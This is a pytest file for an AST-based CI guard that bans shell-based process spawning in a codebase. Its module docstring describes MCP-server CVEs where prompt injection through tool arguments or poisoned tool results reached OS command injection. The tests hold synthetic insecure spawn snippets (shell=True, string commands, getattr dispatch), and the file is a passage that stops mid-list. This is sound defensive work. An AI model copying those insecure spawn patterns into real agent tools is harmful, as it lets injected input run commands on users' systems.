"""Dev-watch item 300 — argv-only process spawning guard + injection fuzz.

CVE-2026-117567 / -117569 / -117573: three MCP servers shipped OS command
injection reachable through prompt injection — a tool parameter (or a value
arriving inside a poisoned tool *result*) was interpolated into a shell
string, so metacharacters in an agent-supplied value executed commands.

The hedge, turned into a permanent CI gate:

* every external binary in ``src/sincor2`` is invoked via argv arrays only;
* ``shell=True``, ``asyncio.create_subprocess_shell``, ``os.system`` and
  ``os.popen`` anywhere under ``src/sincor2`` are failures;
* a ``subprocess.*`` call whose command is a string (constant, f-string or
  concatenation) is a failure;
* round 2 (Builder-B evasion closure): a ``shell=`` keyword on a spawn call
  whose value is not the constant ``False`` (``shell=1``, ``shell='yes'``,
  ``shell=FLAG`` …), any ``**`` unpacking on a ``subprocess.*`` call, the
  whole ``os.exec*`` / ``os.spawn*`` families, dynamic dispatch via
  ``getattr(<subprocess|os|asyncio>, '<spawn name>')``, ``'<lit>'.format()``
  command strings, and names bound to a string command in the same scope
  and then passed to ``subprocess.*`` are all failures too;
* round 3 (Builder-B re-review closure): assign-then-call through a name
  bound to a ``getattr(<module>, '<run-family>')`` result, ``**``
  unpacking on the asyncio spawn calls, ``.format_map()`` and unbound
  ``str.format()`` command strings, and tuple / multi-target / walrus /
  conditional-expression name bindings are failures too;
* prompt-injection-shaped values (plausible hostnames / paths / project
  names carrying metacharacters, not just raw ``;``/``|`` probes) fed into
  the MCP tool-arg handling and the MetaMask adapter command builder must
  stay a single argv element / a URL-quoted path segment / a JSON field —
  never a shell string — and must never reach a shell at all.

The static guard is AST-based: it only inspects real ``Call`` nodes, so a
docstring, comment or string literal that merely *mentions* ``shell=True``
(for example the banned-construct list in ``agency_kernel_tools.py``) does
not false-positive.
"""

from __future__ import annotations

import ast
import subprocess
from pathlib import Path
from types import SimpleNamespace

import pytest

REPO_ROOT = Path(__file__).resolve().parents[2]
SRC_ROOT = REPO_ROOT / "src" / "sincor2"

_SUBPROCESS_FUNCS = {
    "run",
    "Popen",
    "call",
    "check_call",
    "check_output",
    "getoutput",
    "getstatusoutput",
}
# getoutput / getstatusoutput always go through a shell by design.
_ALWAYS_SHELL_FUNCS = {"getoutput", "getstatusoutput"}
# os primitives that execute through a shell or replace / spawn a process
# image directly — none of them take an argv-only contract we can verify.
_OS_BANNED_FUNCS = {
    "system",
    "popen",
    "execl",
    "execle",
    "execlp",
    "execlpe",
    "execv",
    "execve",
    "execvp",
    "execvpe",
    "spawnl",
    "spawnle",
    "spawnlp",
    "spawnlpe",
    "spawnv",
    "spawnve",
    "spawnvp",
    "spawnvpe",
}
# Dynamic dispatch: getattr(<one of these modules>, "<name>") where the
# name resolves to a shell / process-replacing primitive.
_GETATTR_MODULES = {"subprocess", "os", "asyncio"}
_GETATTR_BANNED_EXACT = {
    "system",
    "popen",
    "getoutput",
    "getstatusoutput",
    "create_subprocess_shell",
}


def _getattr_banned(name: str) -> bool:
    return (
        name in _GETATTR_BANNED_EXACT
        or name.startswith("exec")
        or name.startswith("spawn")
    )


# ---------------------------------------------------------------------------
# AST guard (shared by the tree test and the synthetic-source tests)
# ---------------------------------------------------------------------------


def _dotted(node: ast.AST) -> str:
    parts = []
    while isinstance(node, ast.Attribute):
        parts.append(node.attr)
        node = node.value
    if isinstance(node, ast.Name):
        parts.append(node.id)
    return ".".join(reversed(parts))


def _resolve(tree: ast.AST) -> tuple[dict[str, str], dict[str, str]]:
    """Map local names to the stdlib module / function they refer to."""
    modules: dict[str, str] = {}
    funcs: dict[str, str] = {}
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                modules[alias.asname or alias.name.split(".")[0]] = alias.name
        elif isinstance(node, ast.ImportFrom) and node.module:
            for alias in node.names:
                funcs[alias.asname or alias.name] = f"{node.module}.{alias.name}"
    return modules, funcs


def _canonical(dotted: str, modules: dict[str, str], funcs: dict[str, str]) -> str:
    if dotted in funcs:
        return funcs[dotted]
    head, _, rest = dotted.partition(".")
    if head in modules:
        return modules[head] + (f".{rest}" if rest else "")
    return dotted


def _is_string_command(node: ast.AST) -> bool:
    """True when an argv argument is provably a *string* command."""
    if isinstance(node, ast.Constant):
        return isinstance(node.value, (str, bytes))
    if isinstance(node, ast.JoinedStr):  # f-string
        return True
    if isinstance(node, ast.BinOp) and isinstance(node.op, (ast.Add, ast.Mod)):
        return True
    if isinstance(node, ast.NamedExpr):
        return _is_string_command(node.value)
    if isinstance(node, ast.IfExp):
        # A conditional is a string command only when both branches are.
        return _is_string_command(node.body) and _is_string_command(node.orelse)
    if isinstance(node, ast.Call):
        # '<literal>'.format(...) / .format_map(...) builds a string
        # command, and so does unbound str.format('<literal>', ...) —
        # there the template is the first argument, not the receiver.
        func = node.func
        if isinstance(func, ast.Attribute) and func.attr in (
            "format",
            "format_map",
        ):
            if _is_string_command(func.value):
                return True
            if (
                isinstance(func.value, ast.Name)
                and func.value.id == "str"
                and node.args
            ):
                return _is_string_command(node.args[0])
    return False


def _is_string_expr(node: ast.AST) -> bool:
    """Stricter string-shape test for name bindings: at least one operand
    must be provably a string, so ``['a'] + args`` (list concat) is not
    misclassified as a string command."""
    if isinstance(node, ast.Constant):
        return isinstance(node.value, (str, bytes))
    if isinstance(node, ast.JoinedStr):
        return True
    if isinstance(node, ast.BinOp) and isinstance(node.op, (ast.Add, ast.Mod)):
        return _is_string_expr(node.left) or _is_string_expr(node.right)
    if isinstance(node, ast.NamedExpr):
        return _is_string_expr(node.value)
    if isinstance(node, ast.IfExp):
        return _is_string_expr(node.body) and _is_string_expr(node.orelse)
    if isinstance(node, ast.Call):
        func = node.func
        if isinstance(func, ast.Attribute) and func.attr in (
            "format",
            "format_map",
        ):
            if _is_string_expr(func.value):
                return True
            if (
                isinstance(func.value, ast.Name)
                and func.value.id == "str"
                and node.args
            ):
                return _is_string_expr(node.args[0])
    return False


def _classify_binding(value: ast.AST) -> str:
    if isinstance(value, (ast.List, ast.Tuple)):
        return "list"
    if _is_string_expr(value):
        return "string"
    return "other"


def _scope_bindings(scope: ast.AST) -> dict[str, tuple[str, int]]:
    """Name -> (kind, lineno) for assignments made directly in ``scope``
    (module or one function), in source order — a later assignment wins.
    Plain, tuple-unpacking, multi-target and walrus targets are tracked
    per name; a name whose value shape is not provable is "other".
    Nested scopes are not descended into."""
    bindings: dict[str, tuple[str, int]] = {}

    def target_names(target: ast.AST) -> list[str]:
        if isinstance(target, ast.Name):
            return [target.id]
        if isinstance(target, ast.Starred):
            return target_names(target.value)
        if isinstance(target, (ast.Tuple, ast.List)):
            names: list[str] = []
            for elt in target.elts:
                names.extend(target_names(elt))
            return names
        return []

    def bind_target(target: ast.AST, value: ast.AST, lineno: int) -> None:
        if isinstance(target, ast.Name):
            bindings[target.id] = (_classify_binding(value), lineno)
        elif isinstance(target, ast.Starred):
            for name in target_names(target):
                bindings[name] = ("other", lineno)
        elif isinstance(target, (ast.Tuple, ast.List)):
            if (
                isinstance(value, (ast.Tuple, ast.List))
                and len(value.elts) == len(target.elts)
            ):
                for elt_target, elt_value in zip(target.elts, value.elts):
                    bind_target(elt_target, elt_value, lineno)
            else:
                for name in target_names(target):
                    bindings[name] = ("other", lineno)

    def collect(node: ast.AST) -> None:
        for child in ast.iter_child_nodes(node):
            if isinstance(
                child, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef, ast.Lambda)
            ):
                continue
            if isinstance(child, ast.Assign):
                for target in child.targets:
                    bind_target(target, child.value, child.lineno)
            elif (
                isinstance(child, ast.AnnAssign)
                and isinstance(child.target, ast.Name)
                and child.value is not None
            ):
                bindings[child.target.id] = (
                    _classify_binding(child.value),
                    child.lineno,
                )
            elif (
                isinstance(child, ast.AugAssign)
                and isinstance(child.target, ast.Name)
                and _is_string_expr(child.value)
            ):
                bindings[child.target.id] = ("string", child.lineno)
            elif isinstance(child, ast.NamedExpr) and isinstance(
                child.target, ast.Name
            ):
                bindings[child.target.id] = (
                    _classify_binding(child.value),
                    child.lineno,
                )
            collect(child)

    collect(scope)
    return bindings


def _scope_getattr_bindings(
    scope: ast.AST, modules: dict[str, str], funcs: dict[str, str]
) -> dict[str, tuple[str, int]]:
    """Name -> (canonical target, lineno) for names bound directly in
    ``scope`` to a ``getattr(<process module>, '<spawn name>')`` result —
    the assign-then-call spelling of dynamic dispatch. A later binding
    of the same name to anything else shadows it with an empty target,
    the same later-assignment-wins rule as ``_scope_bindings``."""
    bindings: dict[str, tuple[str, int]] = {}

    def target_names(target: ast.AST) -> list[str]:
        if isinstance(target, ast.Name):
            return [target.id]
        if isinstance(target, ast.Starred):
            return target_names(target.value)
        if isinstance(target, (ast.Tuple, ast.List)):
            names: list[str] = []
            for elt in target.elts:
                names.extend(target_names(elt))
            return names
        return []

    def record(name: str, value: ast.AST, lineno: int) -> None:
        resolved = _getattr_target(value, modules, funcs)
        if resolved is not None and _is_spawn_canon(resolved):
            bindings[name] = (resolved, lineno)
        else:
            bindings[name] = ("", lineno)

    def collect(node: ast.AST) -> None:
        for child in ast.iter_child_nodes(node):
            if isinstance(
                child, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef, ast.Lambda)
            ):
                continue
            if isinstance(child, ast.Assign):
                if len(child.targets) == 1 and isinstance(
                    child.targets[0], ast.Name
                ):
                    record(child.targets[0].id, child.value, child.lineno)
                else:
                    for target in child.targets:
                        for name in target_names(target):
                            bindings[name] = ("", child.lineno)
            elif (
                isinstance(child, ast.AnnAssign)
                and isinstance(child.target, ast.Name)
                and child.value is not None
            ):
                record(child.target.id, child.value, child.lineno)
            elif isinstance(child, ast.AugAssign) and isinstance(
                child.target, ast.Name
            ):
                bindings[child.target.id] = ("", child.lineno)
            elif isinstance(child, ast.NamedExpr) and isinstance(
                child.target, ast.Name
            ):
                record(child.target.id, child.value, child.lineno)
            collect(child)

    collect(scope)
    return bindings


def _getattr_target(
    node: ast.AST, modules: dict[str, str], funcs: dict[str, str]
) -> str | None:
    """If ``node`` is a ``getattr(module, 'name')`` call on a stdlib
    process module, return the canonical ``module.name`` it resolves to."""
    if not isinstance(node, ast.Call) or _dotted(node.func) != "getattr":
        return None
    if len(node.args) < 2:
        return None
    mod = _canonical(_dotted(node.args[0]), modules, funcs)
    name_node = node.args[1]
    if (
        mod in _GETATTR_MODULES
        and isinstance(name_node, ast.Constant)
        and isinstance(name_node.value, str)
    ):
        return f"{mod}.{name_node.value}"
    return None


def _command_arg(node: ast.Call) -> ast.AST | None:
    if node.args:
        return node.args[0]
    for kw in node.keywords:
        if kw.arg == "args":
            return kw.value
    return None


def _is_spawn_canon(canon: str) -> bool:
    return canon.startswith("subprocess.") or canon in (
        "asyncio.create_subprocess_exec",
        "asyncio.create_subprocess_shell",
    )


def violations_from_ast(tree: ast.AST, filename: str = "<synthetic>") -> list[str]:
    modules, funcs = _resolve(tree)
    found: list[str] = []
    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue
        where = f"{filename}:{node.lineno}"
        # Dynamic dispatch spelling: flag the getattr() itself when it
        # resolves to a banned primitive, even if it is only assigned.
        target = _getattr_target(node, modules, funcs)
        if target is not None and _getattr_banned(target.rsplit(".", 1)[-1]):
            found.append(
                f"{where}: getattr() dynamic dispatch to {target} "
                "(shell / process-replacing primitive)"
            )
        dotted = _dotted(node.func)
        canon = _canonical(dotted, modules, funcs) if dotted else ""
        via_getattr = False
        if not dotted:
            # Call of a getattr(...) result: resolve it so the ordinary
            # shell= / ** / string-command checks apply to the real target
            # (this is what makes getattr(subprocess, 'run') safe to leave
            # unflagged at the getattr site itself).
            resolved = _getattr_target(node.func, modules, funcs)
            if resolved is not None:
                canon = resolved
                via_getattr = True
        if _is_spawn_canon(canon):
            for kw in node.keywords:
                if kw.arg is None:
                    found.append(
                        f"{where}: ** unpacking in call to {canon} hides its "
                        "keywords from the argv-only guard"
                    )
                    break
            for kw in node.keywords:
                if kw.arg == "shell" and not (
                    isinstance(kw.value, ast.Constant) and kw.value.value is False
                ):
                    found.append(
                        f"{where}: shell= in call to {canon} is not the "
                        "constant False"
                    )
        if canon.startswith("os."):
            leaf = canon.rsplit(".", 1)[-1]
            if leaf in _OS_BANNED_FUNCS and not via_getattr:
                found.append(
                    f"{where}: {canon}() is a banned shell / "
                    "process-replacing primitive"
                )
        if "create_subprocess_shell" in canon and not via_getattr:
            found.append(f"{where}: create_subprocess_shell executes through a shell")
        if canon.startswith("subprocess."):
            leaf = canon.rsplit(".", 1)[-1]
            if leaf in _ALWAYS_SHELL_FUNCS:
                if not via_getattr:
                    found.append(
                        f"{where}: subprocess.{leaf}() executes through a shell"
                    )
            elif leaf in _SUBPROCESS_FUNCS:
                cmd = _command_arg(node)
                if cmd is not None and _is_string_command(cmd):
                    found.append(
                        f"{where}: subprocess.{leaf}() called with a string "
                        "command instead of an argv list"
                    )
    found.extend(_name_binding_violations(tree, filename, modules, funcs))
    return found


def _name_binding_violations(
    tree: ast.AST,
    filename: str,
    modules: dict[str, str],
    funcs: dict[str, str],
) -> list[str]:
    """Flag ``subprocess.*(name)`` where ``name`` was bound, earlier in an
    enclosing scope, to a string-shaped command. Conservative: only
    bindings whose shape is provable are tracked, and a later list
    assignment wins (no flag).

    Also resolves names bound to ``getattr(<module>, '<spawn name>')``
    results in an enclosing scope: the ordinary ``shell=`` / ``**`` /
    string-command checks apply at their call sites, exactly as for a
    direct ``getattr(...)`` call."""
    found: list[str] = []

    def lookup(
        name: str, scopes: list[dict[str, tuple[str, int]]]
    ) -> tuple[str, int] | None:
        for scope in reversed(scopes):
            if name in scope:
                return scope[name]
        return None

    def visit(
        node: ast.AST,
        scopes: list[dict[str, tuple[str, int]]],
        gscopes: list[dict[str, tuple[str, int]]],
    ) -> None:
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
            inner = _scope_bindings(node)
            ginner = _scope_getattr_bindings(node, modules, funcs)
            for deco in node.decorator_list:
                visit(deco, scopes, gscopes)
            for default in list(node.args.defaults) + [
                d for d in node.args.kw_defaults if d is not None
            ]:
                visit(default, scopes, gscopes)
            for child in node.body:
                visit(child, scopes + [inner], gscopes + [ginner])
            return
        if isinstance(node, ast.Call):
            dotted = _dotted(node.func)
            canon = _canonical(dotted, modules, funcs) if dotted else ""
            via_getattr_name = False
            if not dotted:
                resolved = _getattr_target(node.func, modules, funcs)
                if resolved is not None:
                    canon = resolved
            elif isinstance(node.func, ast.Name):
                gbinding = lookup(node.func.id, gscopes)
                if (
                    gbinding is not None
                    and gbinding[0]
                    and gbinding[1] < node.lineno
                ):
                    canon = gbinding[0]
                    via_getattr_name = True
            if via_getattr_name and _is_spawn_canon(canon):
                for kw in node.keywords:
                    if kw.arg is None:
                        found.append(
                            f"{filename}:{node.lineno}: ** unpacking in call "
                            f"to {canon} hides its keywords from the "
                            "argv-only guard"
                        )
                        break
                for kw in node.keywords:
                    if kw.arg == "shell" and not (
                        isinstance(kw.value, ast.Constant)
                        and kw.value.value is False
                    ):
                        found.append(
                            f"{filename}:{node.lineno}: shell= in call to "
                            f"{canon} is not the constant False"
                        )
            if canon.startswith("subprocess."):
                leaf = canon.rsplit(".", 1)[-1]
                if leaf in _SUBPROCESS_FUNCS and leaf not in _ALWAYS_SHELL_FUNCS:
                    cmd = _command_arg(node)
                    if isinstance(cmd, ast.Name):
                        binding = lookup(cmd.id, scopes)
                        if (
                            binding is not None
                            and binding[0] == "string"
                            and binding[1] < node.lineno
                        ):
                            found.append(
                                f"{filename}:{node.lineno}: subprocess.{leaf}() "
                                f"called with '{cmd.id}', bound to a string "
                                "command instead of an argv list"
                            )
                    elif (
                        via_getattr_name
                        and cmd is not None
                        and _is_string_command(cmd)
                    ):
                        found.append(
                            f"{filename}:{node.lineno}: subprocess.{leaf}() "
                            "called with a string command instead of an "
                            "argv list"
                        )
        for child in ast.iter_child_nodes(node):
            visit(child, scopes, gscopes)

    visit(
        tree,
        [_scope_bindings(tree)],
        [_scope_getattr_bindings(tree, modules, funcs)],
    )
    return found


def violations_from_source(source: str, filename: str = "<synthetic>") -> list[str]:
    return violations_from_ast(ast.parse(source), filename)


def _src_files() -> list[Path]:
    return sorted(SRC_ROOT.rglob("*.py"))


# ---------------------------------------------------------------------------
# 1. Static guard over the real tree
# ---------------------------------------------------------------------------


class TestStaticGuard:
    def test_src_tree_has_no_shell_execution(self):
        assert SRC_ROOT.is_dir(), f"missing source tree: {SRC_ROOT}"
        all_violations: list[str] = []
        for path in _src_files():
            tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
            all_violations.extend(
                violations_from_ast(tree, str(path.relative_to(REPO_ROOT)))
            )
        assert all_violations == [], (
            "shell-execution violations under src/sincor2 "
            "(dev-watch 300: argv arrays only):\n" + "\n".join(all_violations)
        )

    @pytest.mark.parametrize(
        "rel_path",
        [
            "acceptance_status.py",
            "adapters/metamask_agent_wallet.py",
            "daily_ops.py",
            "sinax/lemma_discovery.py",
        ],
    )
    def test_known_subprocess_call_sites_use_argv_lists(self, rel_path):
        """Every pre-existing subprocess call site passes an argv list."""
        path = SRC_ROOT / rel_path
        tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
        modules, funcs = _resolve(tree)
        calls = [
            node
            for node in ast.walk(tree)
            if isinstance(node, ast.Call)
            and _canonical(_dotted(node.func), modules, funcs).startswith(
                "subprocess."
            )
        ]
        assert calls, f"{rel_path}: expected at least one subprocess call"
        # Names bound to a list/tuple literal in the same file (e.g. the
        # metamask adapter's ``cmd: List[str] = [mm_bin, *args, "--json"]``)
        # are argv form too — resolve them instead of demanding an inline
        # literal at every call site.
        list_names = set()
        for node in ast.walk(tree):
            value = None
            targets: list[ast.AST] = []
            if isinstance(node, ast.Assign):
                value, targets = node.value, list(node.targets)
            elif isinstance(node, ast.AnnAssign):
                value, targets = node.value, [node.target]
            if isinstance(value, (ast.List, ast.Tuple)):
                list_names.update(
                    t.id for t in targets if isinstance(t, ast.Name)
                )
        for call in calls:
            assert call.args, f"{rel_path}:{call.lineno}: no command argument"
            first = call.args[0]
            is_argv = isinstance(first, (ast.List, ast.Tuple)) or (
                isinstance(first, ast.Name) and first.id in list_names
            )
            assert is_argv, (
                f"{rel_path}:{call.lineno}: command must be an argv list, "
                f"got {type(first).__name__}"
            )


class TestGuardItself:
    """The guard must catch the CVE class and ignore mere mentions."""

    @pytest.mark.parametrize(
        "source",
        [
            "import subprocess\nsubprocess.run(cmd, shell=True)\n",
            "import subprocess as sp\nsp.Popen(cmd, shell=True)\n",
            "import asyncio\nasyncio.create_subprocess_shell(cmd)\n",
            "from asyncio import create_subprocess_shell\ncreate_subprocess_shell(cmd)\n",
            "import os\nos.system('ls ' + name)\n",
            "import os\nos.popen('ls')\n",
            "import subprocess\nsubprocess.run('ls -la /tmp')\n",
            "import subprocess\nsubprocess.run(f'ls {name}')\n",
            "import subprocess\nsubprocess.run('ls ' + name)\n",
            "from subprocess import run\nrun('ls -la')\n",
            "import subprocess\nsubprocess.getoutput('ls')\n",
        ],
    )
    def test_guard_detects_shell_patterns(self, source):
        assert violations_from_source(source), f"guard missed: {source!r}"

    @pytest.mark.parametrize(
        "source",
        [
            "import subprocess\nsubprocess.run(['ls', name])\n",
            "import subprocess\ncmd = ['mm', arg, '--json']\nsubprocess.run(cmd)\n",
            # Mentions in docstrings / strings / comments are not calls.
            '"""Never use shell=True here."""\nimport subprocess\nsubprocess.run(["ls"])\n',
            "import subprocess\n# shell=True would be bad\nsubprocess.run(['ls'])\n",
            "BANNED = ['import subprocess', 'shell=True', 'os.system']\n",
            "import subprocess\nsubprocess.run(['ls'], shell=False)\n",
        ],
    )
    def test_guard_ignores_argv_calls_and_mere_mentions(self, source):
        assert violations_from_source(source) == []


class TestGuardRound2Evasions:
    """Builder-B round-1 evasions, closed in round 2. Each synthetic bad
    pattern below was verified to pass the round-1 guard silently."""

    # 1. shell= with anything but the constant False.
    @pytest.mark.parametrize(
        "source",
        [
            "import subprocess\nsubprocess.run(cmd, shell=1)\n",
            "import subprocess\nsubprocess.run(cmd, shell='yes')\n",
            "import subprocess\nsubprocess.run(cmd, shell=FLAG)\n",
            "import subprocess\nsubprocess.run(cmd, shell=bool(1))\n",
            "import subprocess\nsubprocess.run(cmd, shell=True if x else False)\n",
            "import subprocess\nsubprocess.run(cmd, shell=0)\n",
            "from subprocess import Popen\nPopen(cmd, shell=1)\n",
            "import subprocess as sp\nsp.check_output(cmd, shell='yes')\n",
        ],
    )
    def test_non_false_shell_keyword_is_flagged(self, source):
        assert violations_from_source(source), f"guard missed: {source!r}"

    def test_shell_false_still_clean(self):
        src = "import subprocess\nsubprocess.run(['ls'], shell=False)\n"
        assert violations_from_source(src) == []

    # 2. ** unpacking on a subprocess call hides its keywords.
    @pytest.mark.parametrize(
        "source",
        [
            "import subprocess\nsubprocess.run(cmd, **{'shell': True})\n",
            "import subprocess\nsubprocess.run(['ls'], **opts)\n",
            "from subprocess import run\nrun(cmd, **kw)\n",
            "from subprocess import Popen\nPopen(cmd, **kw)\n",
            "import subprocess as sp\nsp.call(cmd, **kw)\n",
        ],
    )
    def test_double_star_unpacking_is_flagged(self, source):
        assert violations_from_source(source), f"guard missed: {source!r}"

    def test_double_star_on_unrelated_call_is_clean(self):
        src = "def f(**kw):\n    return kw\nresult = f(**{'a': 1})\n"
        assert violations_from_source(src) == []

    # 3. The os.exec* and os.spawn* families.
    @pytest.mark.parametrize(
        "func",
        [
            "execl", "execle", "execlp", "execlpe",
            "execv", "execve", "execvp", "execvpe",
            "spawnl", "spawnle", "spawnlp", "spawnlpe",
            "spawnv", "spawnve", "spawnvp", "spawnvpe",
        ],
    )
    def test_os_exec_spawn_families_are_flagged(self, func):
        src = f"import os\nos.{func}('ls')\n"
        assert violations_from_source(src), f"guard missed os.{func}"

    @pytest.mark.parametrize(
        "source",
        [
            "from os import execv\nexecv('ls', ['ls'])\n",
            "from os import spawnlp as sl\nsl(0, 'ls', 'ls')\n",
            "import os as o\no.execvp('ls', ['ls'])\n",
        ],
    )
    def test_os_exec_spawn_import_spellings_are_flagged(self, source):
        assert violations_from_source(source), f"guard missed: {source!r}"

    def test_os_argv_form_posix_spawn_is_clean(self):
        # os.posix_spawn takes an argv list — it is not in the banned
        # spawn* (mode-based, string-path) family.
        src = "import os\nos.posix_spawn('/bin/ls', ['ls'], {})\n"
        assert violations_from_source(src) == []

    # 4. Dynamic dispatch through getattr().
    @pytest.mark.parametrize(
        "source",
        [
            "import os\ngetattr(os, 'system')('ls')\n",
            "import os\ngetattr(os, 'popen')('ls')\n",
            "import os\ngetattr(os, 'execv')('ls', ['ls'])\n",
            "import os\ngetattr(os, 'spawnl')(0, 'ls', 'ls')\n",
            "import subprocess\ngetattr(subprocess, 'getoutput')('ls')\n",
            "import asyncio\ngetattr(asyncio, 'create_subprocess_shell')('ls')\n",
            "import os\nfn = getattr(os, 'system')\n",
            "import subprocess as sp\ngetattr(sp, 'getstatusoutput')('ls')\n",
        ],
    )
    def test_getattr_to_banned_primitive_is_flagged(self, source):
        assert violations_from_source(source), f"guard missed: {source!r}"

    @pytest.mark.parametrize(
        "source",
        [
            # getattr-resolved run/Popen calls are checked by the ordinary
            # rules: a string command / shell= / ** still trip the guard.
            "import subprocess\ngetattr(subprocess, 'run')('ls -la')\n",
            "import subprocess\ngetattr(subprocess, 'Popen')(cmd, shell=1)\n",
            "import subprocess\ngetattr(subprocess, 'run')(cmd, **kw)\n",
        ],
    )
    def test_getattr_resolved_spawn_call_is_checked(self, source):
        assert violations_from_source(source), f"guard missed: {source!r}"

    @pytest.mark.parametrize(
        "source",
        [
            # Same getattr spellings with an argv list stay clean — the
            # resolved call is checked, not the spelling alone.
            "import subprocess\ngetattr(subprocess, 'run')(['ls', '-la'])\n",
            "import os\ngetattr(os, 'getcwd')()\n",
            "x = getattr(obj, 'system')\n",
        ],
    )
    def test_getattr_benign_uses_are_clean(self, source):
        assert violations_from_source(source) == []

    # 5a. '<literal>'.format(...) as the command argument.
    @pytest.mark.parametrize(
        "source",
        [
            "import subprocess\nsubprocess.run('ls {}'.format(name))\n",
            "import subprocess\nsubprocess.run('ls {x}'.format(x=name))\n",
            "from subprocess import run\nrun('ls {}'.format(name))\n",
        ],
    )
    def test_format_call_command_is_flagged(self, source):
        assert violations_from_source(source), f"guard missed: {source!r}"

    def test_format_inside_argv_list_is_clean(self):
        src = "import subprocess\nsubprocess.run(['ls', '{}'.format(name)])\n"
        assert violations_from_source(src) == []

    # 5b. Name bound to a string command in the same scope.
    @pytest.mark.parametrize(
        "source",
        [
            "import subprocess\ncmd = 'ls ' + name\nsubprocess.run(cmd)\n",
            "import subprocess\ncmd = f'ls {name}'\nsubprocess.run(cmd)\n",
            "import subprocess\ncmd = 'ls %s' % name\nsubprocess.run(cmd)\n",
            "import subprocess\ncmd = 'ls {}'.format(name)\nsubprocess.run(cmd)\n",
            "import subprocess\n"
            "def f(name):\n"
            "    cmd = 'ls ' + name\n"
            "    subprocess.run(cmd)\n",
            # Bound at module scope, used inside a function.
            "import subprocess\ncmd = 'ls ' + name\n"
            "def f():\n"
            "    subprocess.run(cmd)\n",
        ],
    )
    def test_name_bound_string_command_is_flagged(self, source):
        assert violations_from_source(source), f"guard missed: {source!r}"

    @pytest.mark.parametrize(
        "source",
        [
            # Reassigned to a list later: the list assignment wins.
            "import subprocess\ncmd = 'ls ' + name\ncmd = ['ls', name]\n"
            "subprocess.run(cmd)\n",
            # List concat is not a string command.
            "import subprocess\ncmd = ['ls'] + args\nsubprocess.run(cmd)\n",
            # Bound to something unprovable: conservative, no flag.
            "import subprocess\ncmd = build_cmd()\nsubprocess.run(cmd)\n",
            # A parameter is not a tracked binding.
            "import subprocess\ndef f(cmd):\n    subprocess.run(cmd)\n",
            # Assignment only after the call: not the command's source.
            "import subprocess\nsubprocess.run(cmd)\ncmd = 'ls ' + name\n",
        ],
    )
    def test_name_binding_conservative_cases_are_clean(self, source):
        assert violations_from_source(source) == []


class TestGuardRound3Evasions:
    """Builder-B re-review spellings, closed in round 3. Each synthetic
    bad pattern below passed the round-2 guard silently."""

    # A. Assign-then-call through a name bound to a getattr() result of
    # the subprocess run/Popen/call/check_* family (or the asyncio spawn
    # pair): the ordinary shell= / ** / string-command checks apply at
    # the name's call sites.
    @pytest.mark.parametrize(
        "source",
        [
            "import subprocess\nr = getattr(subprocess, 'run')\n"
            "r(cmd, shell=True)\n",
            "import subprocess\nr = getattr(subprocess, 'Popen')\n"
            "r('ls -la')\n",
            "import subprocess\nr = getattr(subprocess, 'run')\n"
            "r('ls ' + name)\n",
            "import subprocess\nr = getattr(subprocess, 'check_output')\n"
            "r(cmd, **kw)\n",
            "import subprocess as sp\nr = getattr(sp, 'run')\n"
            "r(cmd, shell=1)\n",
            # A string-bound command name passed through the bound name.
            "import subprocess\ncmd = 'ls ' + name\n"
            "r = getattr(subprocess, 'run')\nr(cmd)\n",
            # Bound and called inside a function scope.
            "import subprocess\n"
            "def f():\n"
            "    r = getattr(subprocess, 'run')\n"
            "    r(cmd, shell=True)\n",
            # The asyncio spawn family carried through a name.
            "import asyncio\nf = getattr(asyncio, 'create_subprocess_exec')\n"
            "f('ls', **kw)\n",
        ],
    )
    def test_getattr_assign_then_call_is_flagged(self, source):
        assert violations_from_source(source), f"guard missed: {source!r}"

    @pytest.mark.parametrize(
        "source",
        [
            # The same names called with an argv list stay clean.
            "import subprocess\nr = getattr(subprocess, 'run')\n"
            "r(['ls', '-la'])\n",
            "import subprocess\nr = getattr(subprocess, 'run')\n"
            "r(['ls'], shell=False)\n",
            # A getattr() result for a non-spawn function is untouched.
            "import os\ng = getattr(os, 'getcwd')\ng()\n",
            # Rebinding the name to something else shadows the dispatch.
            "import subprocess\nr = getattr(subprocess, 'run')\nr = len\n"
            "r(cmd, shell=True)\n",
        ],
    )
    def test_getattr_assign_then_call_benign_is_clean(self, source):
        assert violations_from_source(source) == []

    # B. ** unpacking is checked across the whole spawn canon, not only
    # on subprocess.* calls.
    @pytest.mark.parametrize(
        "source",
        [
            "import asyncio\nasyncio.create_subprocess_exec('ls', **kw)\n",
            "import asyncio\nasyncio.create_subprocess_shell('ls', **kw)\n",
            "from asyncio import create_subprocess_exec\n"
            "create_subprocess_exec('ls', **kw)\n",
        ],
    )
    def test_double_star_on_asyncio_spawn_is_flagged(self, source):
        assert violations_from_source(source), f"guard missed: {source!r}"

    def test_asyncio_spawn_without_unpacking_is_clean(self):
        src = "import asyncio\nasyncio.create_subprocess_exec('ls', '-la')\n"
        assert violations_from_source(src) == []

    # C. format_map() and unbound str.format() build string commands the
    # same way '<literal>'.format() does.
    @pytest.mark.parametrize(
        "source",
        [
            "import subprocess\n"
            "subprocess.run('ls {p}'.format_map({'p': name}))\n",
            "import subprocess\nsubprocess.run(str.format('ls {}', name))\n",
            "import subprocess\nsubprocess.run(str.format_map('ls {p}', {}))\n",
            # Bound to a name first, then passed to subprocess.
            "import subprocess\ncmd = 'ls {p}'.format_map({'p': name})\n"
            "subprocess.run(cmd)\n",
            "import subprocess\ncmd = str.format('ls {}', name)\n"
            "subprocess.run(cmd)\n",
        ],
    )
    def test_format_map_and_unbound_str_format_are_flagged(self, source):
        assert violations_from_source(source), f"guard missed: {source!r}"

    @pytest.mark.parametrize(
        "source",
        [
            # The same constructions inside an argv element are fine.
            "import subprocess\n"
            "subprocess.run(['ls', '{p}'.format_map({'p': name})])\n",
            "import subprocess\nsubprocess.run(['ls', str.format('{}', name)])\n",
        ],
    )
    def test_format_variants_inside_argv_list_are_clean(self, source):
        assert violations_from_source(source) == []

    # D. Binding forms beyond a plain single-target assignment: tuple
    # unpacking, multi-target chains, walrus bindings and conditional
    # expressions all carry the bound value's string shape.
    @pytest.mark.parametrize(
        "source",
        [
